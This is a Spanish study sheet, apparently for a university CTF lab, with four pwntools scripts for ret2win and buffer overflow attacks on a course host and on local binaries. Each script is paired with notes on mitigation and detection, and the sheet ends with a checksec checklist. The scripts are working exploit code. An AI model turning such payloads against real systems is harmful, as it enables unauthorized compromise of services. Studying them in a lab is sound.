# Scripts - Pwn

---

### Scripts (referencia)

- **Ret2win remoto (9992)**
    
    ```python
    from pwn import *
    
    c=remote("[pwn-vulnerable.grafo.etsii.urjc.es](http://pwn-vulnerable.grafo.etsii.urjc.es)",9992) 
    #conexión creo un socket
    
    c.recvuntil(b":") #recibir el prompt
    
    payload  = b"A" * 72 
    #creamos el payload: 
    #72 A para que queden iguales las dos variables
    
    payload += p64(0x40127c)   # dirección en little endian
    # y en 64 bits para retornar
    
    c.sendline(payload) #envío el payload
    
    c.recv() # Interactuar y ver salida
    
    c.interactive()
    ```
    
    **Para defensa**
    
    - Qué indica: patrón de desbordamiento controlado del retorno (offset fijo + dirección).
    - Qué revisar: presencia de *stack canary*, NX, PIE, RELRO y ASLR en el binario/entorno.
    - Mitigación típica: compilar con `-fstack-protector-strong`, `-D_FORTIFY_SOURCE=2`, PIE, RELRO completo, y evitar funciones inseguras (`gets`, `strcpy`, etc.).
    - Detección: crashes repetidos, entradas largas anómalas, y telemetría de segfaults en servicios.
- **Overflow remoto con x00 (9991)**
    
    ```python
    from pwn import *
    #Contexto (muy recomendable)
    c=remote("[pwn-vulnerable.grafo.etsii.urjc.es](http://pwn-vulnerable.grafo.etsii.urjc.es) 9991",9991) 
    #conexión creo un socket
    context.log_level = "debug"  # opcional, para ver qué pasa
    #Recibir el prompt
    c.recv()
    #Payload
    payload  = b"A" * 31 + b"\x00"
    raw = payload * 2
    #Enviar payload
    c.sendline(raw)
    #Recibir respuesta
    c.recvuntil(b"}")
    ```
    
    **Para defensa**
    
    - Qué indica: intentos de manipular strings/validaciones (el `\\x00` suele afectar comparaciones y cortes de cadena).
    - Qué revisar: validaciones basadas en strings C, uso de `strlen`/`strcpy` y límites de lectura.
    - Mitigación típica: límites estrictos (`fgets` con tamaño), validación por longitud, y evitar lógica sensible basada solo en terminadores nulos.
- **Ret2win local (pwnthemall2)**
    
    ```r
    from pwn import *
    
    # Contexto (muy recomendable)
    context.binary = "./pwnthemall2"
    context.log_level = "debug"  # opcional, 
    #para ver qué pasa
    
    # Ejecutar binario local
    c = process("./pwnthemall2")
    
    # Recibir el prompt
    c.recvuntil(b":")
    
    # Payload
    payload  = b"A" * 72
    payload += p64(0x40127c)# Dirección en little endian
    
    # Enviar payload
    c.sendline(payload)
    
    # Recibir respuesta
    c.recv()
    
    # Interactuar
    c.interactive()
    ```
    
    **Para defensa**
    
    - Qué indica: misma familia de fallo que en remoto, pero reproducido localmente.
    - Qué revisar: diferencia de mitigaciones entre local vs servidor (PIE/ASLR), y si hay *leaks* de direcciones.
    - Mitigación típica: activar mitigaciones en compilación y despliegue, y pruebas con sanitizers (`-fsanitize=address`).
- **Overflow local (pwnthemall)**
    
    ```python
    from pwn import *
    #Contexto (muy recomendable)
    context.binary = elf = ELF("./pwnthemall")
    context.log_level = "debug"  # opcional, para ver qué pasa
    #Ejecutar binario local
    c = process("./pwnthemall")#Recibir el prompt
    c.recv()
    #Payload
    payload  = b"A" * 31 + b"\x00"
    raw = payload * 2
    #Enviar payload
    c.sendline(raw)
    #Recibir respuesta
    c.recv()
    ```
    
    **Para defensa**
    
    - Qué indica: entrada maliciosa repetida para forzar comportamiento inesperado (overflow / lógica de parsing).
    - Qué revisar: tamaño de buffers, lecturas, y comprobaciones de límites antes de copiar/concatenar.
    - Mitigación típica: safe APIs, fuzzing (AFL/LibFuzzer) y *input hardening*.

---

### Checklist rápido (defensivo)

- Mirar en pwndbg con `checksec -file <nombre_archivo>`
- [ ]  ¿El binario está compilado con canary, PIE y RELRO completo?
- [ ]  ¿NX y ASLR están activos en el entorno de ejecución?
- [ ]  ¿Se usan funciones seguras y límites de lectura/copia?
- [ ]  ¿Hay logging/monitorización de crashes (segfault) y alertas por tasas anómalas?
- [ ]  ¿Se han hecho pruebas con sanitizers y/o fuzzing?

### Pendiente para dejarlo perfecto

- Si quieres, dime qué representa cada script (reto/lab) y renombro los toggles con un patrón consistente: **Objetivo + Entorno + Puerto/Binario**.